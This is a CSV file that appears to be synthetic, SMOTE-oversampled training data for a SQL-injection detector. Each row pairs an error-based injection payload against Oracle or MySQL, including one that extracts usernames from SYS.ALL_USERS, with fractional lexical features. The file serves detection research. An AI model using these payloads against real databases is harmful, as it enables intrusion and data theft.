id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001043,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000008,1.5487468640901414,338.8132389988719,34.635539833145316,3.5569874017025858,86.03762841488053,50.72892033370936,144.09338050056405,57.953309749717974,0.2535811983231556,0.14985504652975437,0.4255370086786843,0.17102674646840574,0.0,1.2710796662906376,1.0,0.0,0.0,2.3177699165726593,0.0,30.04669025028202,0.0,0.9533097497179783,0.6822300834273403,23.317769916572658,0.0,0.3177699165726594,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.3177699165726594,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.31776991657266
SMOTE_001044,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,4.172412227382704,253.53525002954697,39.06815517173455,4.114117155609388,114.20446551520365,21.10281897944168,88.23912932291078,29.988836211990858,0.46575785448014684,0.07179702570519536,0.3457579310435393,0.1166871887711185,3.465922414132724,0.0,0.0,0.0,0.9318448282654478,2.5340775858672764,0.0,14.65922414132724,0.0,3.0681551717345528,2.8636896565308954,4.397767242398171,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.46592241413272384,0.0,2.9318448282654477,0.0,1.0,2.0,1.0681551717345523,0.46592241413272384,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4659224141327238,0.0,0.0,0.0,0.0,0.0,0.46592241413272384,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.46592241413272384,0.0,0.0,0.0,8.863689656530894
SMOTE_001045,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000009,0.3151455836016893,213.11681171118505,37.74617915654885,3.7794788463315876,63.91375503642415,37.406113349521846,88.69541498785861,23.101528337380458,0.2996564451281499,0.17543085786132848,0.4165060420724592,0.10840665493806244,0.10152833738046074,0.0,0.9492358313097697,0.0,0.9492358313097696,1.0507641686902303,0.0,15.898471662619539,0.0,0.0,3.1015283373804605,3.0507641686902307,0.05076416869023037,0.0,0.0,0.9492358313097696,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0507641686902305,0.0,0.05076416869023037,0.0,0.0,0.9492358313097695,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9492358313097695,0.0,1.0,1.0,6.0
SMOTE_001046,attack,error,-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,nearest_attack_euclidean,R000011,1.3019786339906456,332.9116078367251,35.392261442183234,3.6174360076579357,88.35356865309942,49.21547711563353,138.34256206799222,57.0,0.26546949174474277,0.14781317412540482,0.41549778410911276,0.17121955002073969,0.0,0.0,2.392261442183235,0.0,0.0,2.0,0.0,28.911607836725146,0.0,2.088392163274852,0.3038692789083828,24.392261442183234,0.0,0.0,0.6961307210916174,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001047,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,1.4236231832107074,333.82958326822524,33.414791634112625,3.4637963636470803,80.58520836588738,50.24437490233787,146.0,57.0,0.24140269948558338,0.1504973086131099,0.43735270353493,0.1707472883663768,0.5852083658873763,0.0,0.41479163411262393,0.0,0.0,2.0,0.0,31.0,0.0,0.0,1.0,22.414791634112625,0.5852083658873761,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.5852083658873761,0.4147916341126238,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001048,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000009,0.7997424116192683,211.64102090043548,37.16238210101613,3.7940234828129435,64.67523579796774,37.0,86.96578510246773,23.0,0.3056957134702926,0.1748280722822941,0.41079930445031154,0.10867690979710175,0.4786387994193546,0.0,0.8803403001451612,0.0,0.8803403001451612,1.119659699854839,0.0,15.521361200580646,0.0,0.0,3.239319399709678,2.8803403001451615,0.11965969985483887,0.0,0.0,0.8803403001451613,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.11965969985483893,0.8803403001451611,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8803403001451613,0.0,1.0,1.0,5.880340300145161
SMOTE_001049,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,2.076304888107544,338.168519920144,33.43070999334533,3.539798841117348,86.5992299134893,50.72283997338132,143.415740039928,57.43070999334533,0.2558288153167104,0.14993644283456434,0.42437948840105333,0.16985525344767194,1.0,0.0,0.8614199866906599,0.0,0.0,2.4307099933453302,0.0,29.70787001996401,0.0,1.29212998003599,0.5692900066546702,23.29212998003599,1.0,0.0,0.43070999334533006,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.43070999334533006,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.43070999334533
SMOTE_001050,attack,error,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp",nearest_attack_euclidean,R000013,0.8248059876494275,347.48444105894345,35.6770392940377,3.7004669873484963,96.90075541124502,49.453323176830374,141.2918428238492,59.83851964701885,0.27890985971895116,0.14228941927979294,0.4065907592558551,0.17220996174540085,0.0,3.5155589410565433,1.1614803529811524,0.0,0.0,3.0,0.0,28.322960705962306,0.0,2.5155589410565433,0.16148035298115238,24.16148035298115,0.0,1.0,0.16148035298115226,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.16148035298115226,1.0,1.0,0.8385196470188476,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_001051,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000015,1.0045489380027712,233.3528809514444,31.759816468449085,3.640497487755584,66.87251388834255,37.45588988106945,98.63233035679164,30.39214682524073,0.2861361107325038,0.16093162391018437,0.42274468016511524,0.13018758519219661,0.0,3.544110118930549,0.3039265873796339,0.0,0.15196329368981698,2.0,0.0,17.696073412620365,1.6960734126203656,0.0,4.848036706310183,2.455889881069451,0.0,1.0,0.15196329368981706,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.3039265873796342,0.0,0.15196329368981704,0.15196329368981698,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.848036706310183,0.848036706310183,5.3039265873796335
SMOTE_001052,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,2.1444583075541526,339.88927536203056,33.40525149188415,3.4912664306747097,83.02625745942075,52.242011935073194,146.8105029837683,57.8105029837683,0.2442446368911423,0.1535136463461165,0.4321240951586305,0.1701176216041107,0.5947485081158508,0.4052514918841493,0.8105029837682988,0.0,0.0,2.405251491884149,0.0,30.59474850811585,0.0,0.0,1.0,23.215754475652446,0.5947485081158507,0.4052514918841494,0.40525149188414933,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.4052514918841494,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.405251491884149
SMOTE_001053,attack,error,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,nearest_attack_euclidean,R000022,0.2309300206400388,344.41335889942343,34.08380587151094,3.716495970784054,103.49716477093436,45.12570880726641,137.87429119273358,57.91619412848906,0.300464403173802,0.13104574095216828,0.40032914692738436,0.16816070894664537,3.8323882569781182,0.0,0.04190293575547044,0.0,0.0,2.0,0.0,28.0,0.0,3.0,0.0,22.04190293575547,0.9580970642445296,0.0,0.0,0.04190293575547044,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.916194128489059,0.04190293575547044,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.958097064244529
SMOTE_001054,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000007,1.7400795268373437,295.70014676956123,37.459379586548785,4.055928122741492,107.86410607221349,49.593795865487884,105.05317545203667,33.18906937982318,0.365479151309935,0.1662156617982709,0.3553886809226193,0.11291650596917477,3.1890693798231826,0.0,0.0,0.0,2.0,1.0,0.0,19.45937958654879,0.0,0.5406204134512116,6.0,3.729689793274394,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.189069379823183,2.1890693798231826,0.0,1.2703102067256058,0.7296897932743942,0.7296897932743942,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2703102067256058,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,12.378138759646365
SMOTE_001055,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000023,2.2497586222701513,288.14261235759295,38.966343357222286,3.968898548523378,104.2435822859261,40.24358228592609,107.62179114296305,36.033656642777714,0.36169053353225555,0.13940029053618425,0.37361258686428334,0.1252965890672769,0.6554477857407611,1.3782088570369553,1.3108955714815225,0.0,2.0,2.0,0.0,20.0,0.6891044285184776,2.0,5.0,5.310895571481523,0.6554477857407611,0.3445522142592389,0.6554477857407612,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.6554477857407612,2.0,0.3445522142592389,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_001056,attack,error,1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R000003,1.873338876551099,345.0,34.0,3.677991193259261,97.92132012696862,49.86294389842511,139.21573597460628,58.0,0.28382991341150327,0.14453027216934813,0.40352387239016313,0.1681159420289855,2.1763960380905853,0.0,1.2157359746062766,0.0,0.0,2.6078679873031385,0.0,28.0,0.0,3.0,0.0,23.823603961909413,1.0,0.0,0.6078679873031383,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.6078679873031383,1.0,1.3921320126968617,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_001057,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000007,1.9174251423448712,293.936978436147,37.404280576129594,4.0542829499640165,107.34066547323114,49.04280576129593,104.44708633742553,33.10642086419439,0.3659333786242316,0.16524711484015991,0.3554657404981187,0.11335376603748984,3.1064208641943902,0.0,0.0,0.0,2.0,1.0,0.0,19.404280576129594,0.0,0.5957194238704067,6.0,3.702140288064796,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.10642086419439,2.1064208641943902,0.0,1.2978597119352033,0.7021402880647967,0.7021402880647967,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.29785971193520333,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,12.21284172838878
SMOTE_001058,attack,error,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv",nearest_attack_euclidean,R000026,2.6498733694777665,324.9908547836119,38.0,3.927999425556851,109.91344109636469,49.5193534218118,125.92822190998245,39.62983835545295,0.34013533186828987,0.15182272900624497,0.38581362482046866,0.12222831430499646,4.0,0.0,0.0,0.0,2.0,2.0,0.0,23.2596767109059,0.0,0.9134410963647002,5.54327945181765,5.456720548182351,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.0865589036353,1.6298383554529496,0.45672054818235014,1.45672054818235,0.5432794518176499,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4567205481823501,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,12.62983835545295
SMOTE_001059,attack,error,"1""   )    )    as czzg where 5483  =  5483 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000030,1.4735791233619588,218.34998175504757,34.885420467698424,3.672858676144142,58.120822690444406,39.331252280619054,93.00624315814284,27.89166362584126,0.26555508481482226,0.1807325026360404,0.42605101826380415,0.12766139428533319,0.0,1.6687477193809448,1.55416818707937,0.0,0.777084093539685,2.0,0.0,16.44583181292063,0.44583181292062996,0.0,4.222915906460315,4.331252280619055,0.0,1.0,0.777084093539685,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.55416818707937,0.0,0.777084093539685,0.777084093539685,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.22291590646031506,0.22291590646031506,6.5541681870793695
SMOTE_001060,attack,error,"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000016,0.8793797128964852,348.83637121428706,34.0,3.5694385192474316,87.86180605714067,56.06909697142967,146.13819394285935,58.76727424285742,0.2519395792593834,0.1607081638160333,0.4188868318036131,0.16846542512097024,0.2327257571425827,0.7672742428574173,2.0,0.0,0.0,3.0,0.0,29.534548485714836,0.0,0.6981772714277483,0.7672742428574173,25.0,0.2327257571425828,0.7672742428574171,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_001061,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,1.4832385254810787,228.3879315969055,41.5012616192103,4.295486692265413,128.63477754887975,2.0,73.25189242881544,24.501261619210293,0.561824324813749,0.008820822461391237,0.32200491560307193,0.10734993712178785,3.0,0.0,0.0,0.0,0.0,3.3753154048025733,0.0,10.0,0.0,5.12594621440772,1.0,3.3753154048025733,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.3753154048025733,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.375315404802573
SMOTE_001062,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,0.9666284679800985,260.9094251008933,36.4670362784664,4.0150998649159915,97.96980836696443,36.868145113865616,93.43684464543084,32.63462697463241,0.3757563095567627,0.14120934745410005,0.358029926141001,0.12500441684813626,1.7005544176996055,0.0,0.0,0.0,2.0,1.233518139233202,0.0,18.467036278466402,0.0,2.0,5.766481860766798,3.700554417699605,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.233518139233202,0.0,0.23351813923320186,2.0,0.0,0.23351813923320186,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.700554417699605
SMOTE_001063,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000024,0.6882601035796336,235.53085107720727,40.434225973504205,3.8914016029735934,71.92549523618207,43.491269262677875,95.49126926267787,24.622817315669465,0.30518988045499373,0.18442236737319032,0.40575634811352584,0.10463140405829013,0.0,0.8114086578347339,1.0,0.0,1.0,1.811408657834734,0.0,16.0,0.0,0.0,3.0,3.8114086578347344,0.0,0.8114086578347339,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.8114086578347339,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.811408657834734
SMOTE_001064,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,0.03463942520213486,249.24042235465643,36.0,4.012528499441277,94.1346365186076,35.0,89.07693515349006,31.028850682558772,0.3776701666783277,0.1404389121095627,0.35739687602460357,0.12449404518750601,1.0288506825587724,0.0,0.0,0.0,2.0,1.0096168941862573,0.0,18.0,0.0,2.0,5.990383105813742,3.0096168941862578,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.019233788372514993,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.019233788372516
SMOTE_001065,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,1.0721273426966653,256.44132960403306,36.0,4.017776973525943,98.16714457825852,35.0,91.38122547329058,31.892959552483966,0.38246612753506376,0.13674484014684787,0.35641319743338923,0.12437583488469912,1.8929595524839675,0.0,0.0,0.0,2.0,1.2976531841613226,0.0,18.0,0.0,2.0,5.702346815838677,3.297653184161322,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.5953063683226449,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.595306368322644
SMOTE_001066,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000007,2.907418653482486,319.62431567360494,39.41949621577248,4.062780847864281,111.58050378422752,58.78532324205995,114.78532324205995,34.4731654052575,0.34936786170477924,0.18373507647914036,0.3590244075289408,0.10787265428713963,2.1073383789700246,0.47316540525749395,0.9463308105149879,0.0,2.0,1.473165405257494,0.0,20.473165405257493,0.0,0.0,6.0,5.419496215772481,0.526834594742506,0.47316540525749406,0.4731654052574939,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.473165405257494,1.0,1.0,0.5268345947425059,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
